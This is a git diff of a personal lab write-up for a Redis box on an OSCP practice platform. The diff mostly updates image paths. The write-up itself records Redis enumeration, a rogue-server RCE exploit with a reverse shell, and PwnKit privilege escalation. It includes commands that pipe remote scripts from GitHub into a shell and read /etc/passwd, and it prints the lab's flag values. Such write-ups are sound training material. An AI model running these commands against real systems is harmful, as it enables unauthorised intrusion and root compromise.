@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-14
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Hard
@@ -64,49 +65,49 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - 6379 (Redis 4.0.14)
 - Identified `Redis 4.0.14` from NMap scan, and attempted to connect with `nc -vn 192.168.243.176 6379`
-![[Pasted image 20241016210705.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016210705.png]]
 - Enumerated `redis` with command `INFO`
-![[Pasted image 20241016210758.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016210758.png]]
 - Enumerated `redis` with command `client list`
-![[Pasted image 20241016211014.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016211014.png]]
 - Enumerated `redis` with command `CONFIG GET *` and identified `dump.rdb`
-![[Pasted image 20241016211113.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016211113.png]]
 ---
 # Exploitation
 - Identified `redis 4.0.14` is vulnerable to [CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)
 - Identified Redis(<=5.05) RCE exploit from `https://github.com/n0b0dyCN/redis-rogue-server`
 - Ran `./redis-rogue-server.py --rhost 192.168.243.176 --lhost 192.168.45.205` with command for reverse shell to port `4444`
-![[Pasted image 20241016213143.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016213143.png]]
 - Caught reverse shell with netcat listener on port `4444` with user `prudence`
-![[Pasted image 20241016213258.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016213258.png]]
 
 ---
 # Privilege Escalation
 ## Local Enumeration
  - Ran `cat /home/prudence/local.txt` and printed local flag `704c046724f3d52f31c9567446105364`
- ![[Pasted image 20241016213517.png]]
+ ![[Cybersecurity-Resources/images/Pasted image 20241016213517.png]]
 - Ran `cat /home/prudence/notes.txt` and identified `protected mode` not turned on
-![[Pasted image 20241016213959.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016213959.png]]
 - Ran `cat /etc/passwd` to identify any other users
-![[Pasted image 20241016213707.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016213707.png]]
 - Ran `sudo -l` to check `sudo` privileges and identified `prudence` can run `/usr/local/bin/redis-status` without a password
-![[Pasted image 20241016213841.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016213841.png]]
 - Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download & run `linpeas.sh` 
-![[Pasted image 20241016221127.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016221127.png]]
 - Identified potential vulnerabilities for privilege escalation
-![[Pasted image 20241016220933.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016220933.png]]
 - script crashed at `Analyzing Redis Files`
-![[Pasted image 20241016215416.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016215416.png]]
 - Checked for `redis.conf` and ran `grep -i pass /etc/redis/redis.conf` to check for passwords
-![[Pasted image 20241016220223.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016220223.png]]
 - Ran `sudo /usr/local/bin/redis-status` and identified `redis-service` requires authorization key
-![[Pasted image 20241016220419.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016220419.png]]
 ## Privilege Escalation vector
 - Identified target is potentially vulnerable to CVE-2021-4034 (PwnKit) and found exploit at `https://github.com/ly4k/PwnKit/tree/main`
 - Ran `sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"` on target and achieved `root` access
-![[Pasted image 20241016221513.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016221513.png]]
 - Ran `cat /root/proof.txt` to print `deefd9189289f94bf366e55ae58fdfd3`
-![[Pasted image 20241016221614.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241016221614.png]]
 ---
 # Trophy & Loot
 `local.txt` = `704c046724f3d52f31c9567446105364`
